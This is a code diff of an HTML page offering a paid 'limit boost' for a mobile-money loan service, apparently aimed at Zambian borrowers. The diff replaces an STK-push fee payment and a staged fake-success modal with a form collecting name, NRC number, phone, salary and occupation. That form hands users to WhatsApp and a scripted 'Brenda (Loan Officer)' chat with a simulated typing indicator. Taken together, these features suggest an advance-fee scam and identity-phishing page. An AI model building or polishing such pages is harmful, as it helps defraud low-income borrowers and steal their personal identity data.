@@ -176,49 +176,75 @@
           
           <!-- Payment form details -->
           <div class="checkout-form-area">
-            <div class="checkout-header">
-              <h2>Secure Checkout</h2>
-              <p>Authorize STK Push to complete your borrowing limit upgrade</p>
+            <div class="checkout-header" id="checkoutHeader">
+              <h2>Upgrade Application</h2>
+              <p>Submit your details to connect with a support agent and complete your upgrade</p>
             </div>
 
-            <!-- Provider Selector -->
-            <div class="provider-selector">
-              <label class="input-label">Select Mobile Money Network</label>
-              <div class="provider-cards">
-                <div class="provider-card active" data-provider="mtn" onclick="selectProvider('mtn')">
-                  <div class="provider-logo mtn-logo">MTN</div>
-                  <span class="provider-name">MTN MoMo</span>
-                  <span class="provider-badge">Popular</span>
-                </div>
-                <div class="provider-card" data-provider="airtel" onclick="selectProvider('airtel')">
-                  <div class="provider-logo airtel-logo">Airtel</div>
-                  <span class="provider-name">Airtel Money</span>
-                  <span class="provider-badge">Instant</span>
-                </div>
-                <div class="provider-card" data-provider="zamtel" onclick="selectProvider('zamtel')">
-                  <div class="provider-logo zamtel-logo">Zamtel</div>
-                  <span class="provider-name">Zamtel Cash</span>
-                  <span class="provider-badge">Low Fee</span>
-                </div>
-              </div>
-            </div>
-
-            <form id="paymentForm" class="checkout-form" onsubmit="handlePaymentSubmit(event)">
+            <form id="upgradeForm" class="checkout-form" onsubmit="handleUpgradeSubmit(event)">
               <div class="form-row">
+                <div class="form-group">
+                  <label for="mobileProvider" class="input-label">Mobile Money Network</label>
+                  <select id="mobileProvider" required onchange="handleProviderChange()">
+                    <option value="" disabled selected>Select Provider...</option>
+                    <option value="MTN MoMo">MTN MoMo</option>
+                    <option value="Airtel Money">Airtel Money</option>
+                    <option value="Zamtel Cash">Zamtel Cash</option>
+                    <option value="Other">Other (Type Below)</option>
+                  </select>
+                  <small class="form-helper">Choose your mobile operator</small>
+                </div>
+
                 <div class="form-group">
                   <label for="phoneNumber" class="input-label">Mobile Money Number</label>
                   <div class="input-wrapper">
                     <span class="phone-prefix" id="phonePrefix">+260</span>
                     <input type="tel" id="phoneNumber" placeholder="97XXXXXXX" required>
                   </div>
-                  <small class="form-helper">Enter the phone number registered with MTN/Airtel/Zamtel</small>
+                  <small class="form-helper">Enter the registered phone number</small>
+                </div>
+              </div>
+
+              <!-- Extra field for typing provider if "Other" is selected -->
+              <div class="form-group hidden" id="customProviderGroup">
+                <label for="customProvider" class="input-label">Specify Mobile Money Provider</label>
+                <input type="text" id="customProvider" placeholder="Enter your provider name">
+              </div>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="fullName" class="input-label">Full Name</label>
+                  <input type="text" id="fullName" placeholder="e.g. Mwansa Banda" required>
+                  <small class="form-helper">As it appears on your ID card</small>
                 </div>
 
                 <div class="form-group">
                   <label for="nrcNumber" class="input-label">NRC (National Registration Card)</label>
                   <input type="text" id="nrcNumber" placeholder="XXXXXX/XX/X" required>
-                  <small class="form-helper">Format: 6 digits / 2 digits / 1 digit (e.g. 123456/78/9)</small>
+                  <small class="form-helper">Format: XXXXXX/XX/X (e.g. 123456/78/9)</small>
                 </div>
+              </div>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="currentLimit" class="input-label">Current Loan Limit (ZMW)</label>
+                  <input type="number" id="currentLimit" placeholder="e.g. 500" min="0" required>
+                  <small class="form-helper">Enter your current borrowing limit</small>
+                </div>
+
+                <div class="form-group">
+                  <label for="occupation" class="input-label">Occupation / Profession</label>
+                  <input type="text" id="occupation" placeholder="e.g. Teacher, Merchant" required>
+                  <small class="form-helper">Your current job or business type</small>
+                </div>
+              </div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="monthlySalary" class="input-label">Monthly Net Salary (ZMW)</label>
+                  <input type="number" id="monthlySalary" placeholder="e.g. 4500" min="0" required>
+                  <small class="form-helper">Your monthly net take-home income</small>
+                </div>
+                <div class="form-group"></div>
               </div>
 
               <!-- Invisible properties holding selected package details -->
@@ -227,9 +253,45 @@
               <input type="hidden" id="selectedPackageFee" value="0">
 
               <button type="submit" class="btn-primary full-width font-large shadow-glow ripple">
-                <span id="submitButtonText">PAY K399 VIA STK PUSH</span>
+                <span id="submitButtonText">SUBMIT APPLICATION TO AGENT</span>
               </button>
             </form>
+
+            <!-- Inbuilt Live Support Chat Area -->
+            <div class="chat-area hidden" id="chatArea">
+              <div class="chat-header">
+                <div class="chat-agent-info">
+                  <div class="chat-avatar-wrapper">
+                    <div class="chat-avatar">B</div>
+                    <span class="chat-online-dot"></span>
+                  </div>
+                  <div class="chat-status-details">
+                    <span class="chat-agent-name">Brenda (Loan Officer)</span>
+                    <span class="chat-status">Active Now</span>
+                  </div>
+                </div>
+              </div>
+              <div class="chat-messages" id="chatMessages">
+                <!-- Messages will be rendered here dynamically -->
+              </div>
+              <div class="chat-typing hidden" id="chatTyping">
+                <div class="typing-bubble">
+                  <div class="typing-dot"></div>
+                  <div class="typing-dot"></div>
+                  <div class="typing-dot"></div>
+                </div>
+                <span class="typing-text">Brenda is typing...</span>
+              </div>
+              <form class="chat-input-area" id="chatInputForm" onsubmit="sendUserMessage(event)">
+                <input type="text" id="chatInput" placeholder="Type a reply to Brenda..." required autocomplete="off">
+                <button type="submit" class="chat-send-btn">
+                  <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2.5" fill="none">
+                    <line x1="22" y1="2" x2="11" y2="13"></line>
+                    <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+                  </svg>
+                </button>
+              </form>
+            </div>
           </div>
 
           <!-- Checkout summary sidebar -->
@@ -246,7 +308,7 @@
               </div>
               <div class="summary-item">
                 <span>Disbursement Wallet</span>
-                <strong id="summaryWallet">MTN MoMo (+260)</strong>
+                <strong id="summaryWallet">Not Selected (+260)</strong>
               </div>
               <div class="summary-total">
                 <span>Total Boost Fee</span>
@@ -254,12 +316,12 @@
               </div>
 
               <div class="checkout-instructions">
-                <h4>Payment Instructions</h4>
+                <h4>Application Instructions</h4>
                 <ol>
-                  <li>Ensure your SIM card is active and in this device.</li>
-                  <li>Have your Mobile Money PIN ready.</li>
-                  <li>Click "PAY VIA STK PUSH".</li>
-                  <li>Wait for the prompt to display on your screen and authorize it.</li>
+                  <li>Select your mobile money provider and enter your phone number.</li>
+                  <li>Provide your National Registration Card (NRC) number.</li>
+                  <li>Enter your current loan limit, occupation, and monthly salary.</li>
+                  <li>Click "SUBMIT APPLICATION TO AGENT" to be redirected to WhatsApp to complete your upgrade with our representative.</li>
                 </ol>
               </div>
 
@@ -322,109 +384,7 @@
     </div>
   </section>
 
-  <!-- STK Processing Modal -->
-  <div class="modal-overlay hidden" id="stkModal">
-    <div class="modal-card">
-      <div class="modal-header">
-        <div class="modal-icon spinner">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-            <circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle>
-            <path d="M12 2a10 10 0 0 1 10 10"></path>
-          </svg>
-        </div>
-        <h3 id="modalTitle">Sending STK Push</h3>
-        <p id="modalSub">Do not close this screen or lock your device</p>
-      </div>
-
-      <div class="modal-content">
-        <!-- Progress Steps -->
-        <div class="progress-stepper">
-          <div class="step active" id="step1">
-            <div class="step-indicator">
-              <span class="step-num-val">1</span>
-              <span class="step-check-icon">✓</span>
-            </div>
-            <div class="step-details">
-              <h4>Initiating Transaction</h4>
-              <p>Connecting to secure mobile payment gateway</p>
-            </div>
-          </div>
-          
-          <div class="step" id="step2">
-            <div class="step-indicator">
-              <span class="step-num-val">2</span>
-              <span class="step-check-icon">✓</span>
-            </div>
-            <div class="step-details">
-              <h4>Awaiting User PIN</h4>
-              <p id="step2Text">Please enter your Mobile Money PIN when the prompt appears</p>
-            </div>
-          </div>
-          
-          <div class="step" id="step3">
-            <div class="step-indicator">
-              <span class="step-num-val">3</span>
-              <span class="step-check-icon">✓</span>
-            </div>
-            <div class="step-details">
-              <h4>Verifying Payment</h4>
-              <p>Confirming funds receipt from telecom network</p>
-            </div>
-          </div>
-
-          <div class="step" id="step4">
-            <div class="step-indicator">
-              <span class="step-num-val">4</span>
-              <span class="step-check-icon">✓</span>
-            </div>
-            <div class="step-details">
-              <h4>Upgrading Zamloan Profile</h4>
-              <p>Applying limit boost and activating profile tiers</p>
-            </div>
-          </div>
-        </div>
-
-        <!-- Success card (Revealed at the end) -->
-        <div class="success-alert-box hidden" id="modalSuccessBox">
-          <div class="success-badge">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
-              <polyline points="20 6 9 17 4 12"></polyline>
-            </svg>
-          </div>
-          <h3>Limit Boost Success!</h3>
-          <p>Your profile has been upgraded. Your new borrowing limit has been activated.</p>
-          <div class="success-details">
-            <div class="detail-row">
-              <span>Account Number</span>
-              <strong id="successPhone">097*****12</strong>
-            </div>
-            <div class="detail-row">
-              <span>New Limit</span>
-              <strong id="successLimit" class="highlight-green">K12,500</strong>
-            </div>
-            <div class="detail-row">
-              <span>Status</span>
-              <span class="status-pill-green">ACTIVE & INSTANT</span>
-            </div>
-          </div>
-          <button class="btn-primary full-width margin-top" onclick="closeModalAndReset()">
-            Finish Boost Process
-          </button>
-        </div>
-        
-        <!-- Error card (Fallback) -->
-        <div class="error-alert-box hidden" id="modalErrorBox">
-          <div class="error-badge">✕</div>
-          <h3>Transaction Failed</h3>
-          <p id="modalErrorMsg">The transaction was cancelled or timed out.</p>
-          <button class="btn-secondary full-width margin-top" onclick="closeModalAndRetry()">
-            Try Again
-          </button>
-        </div>
-
-      </div>
-    </div>
-  </div>
+  <!-- STK Push flow is deprecated. Direct human agent referral active. -->
 
   <!-- Footer Section -->
   <footer class="footer-section">
